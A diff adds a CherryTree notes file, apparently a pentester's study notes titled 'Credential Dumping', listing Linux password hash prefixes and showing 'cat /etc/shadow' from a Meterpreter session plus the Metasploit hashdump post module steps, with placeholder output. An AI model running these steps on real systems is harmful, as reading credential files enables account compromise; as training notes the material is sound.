@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="47" master_id="0" name="Credential Dumping" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1730895205" ts_lastsave="1730895243">
+    <rich_text>Types of Hashing algorithm: 
+
+| Value | Hashing Algorithm |
+| ----- | ----------------- |
+| $1    | MD5               |
+| $2    | Blowfish          |
+| $5    | SHA-256           |
+| $6    | SHA-512           |
+**whit meterpreter session**:
+cat /etc/shadow
+root: **$password-hash$**
+
+- Cracking hash: 
+- 
+	-hash dump module (msf): 
+
+	
+</rich_text>
+    <codebox char_offset="333" justification="left" frame_width="500" frame_height="50" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">search hashdump
+	#gather/hashdump
+	set SESSION 2 
+	run
+	#root:  **$password-hash$**
+	#Unshadowed Password File /root/route/etc/etc/etc...
+</codebox>
+  </node>
+</cherrytree>
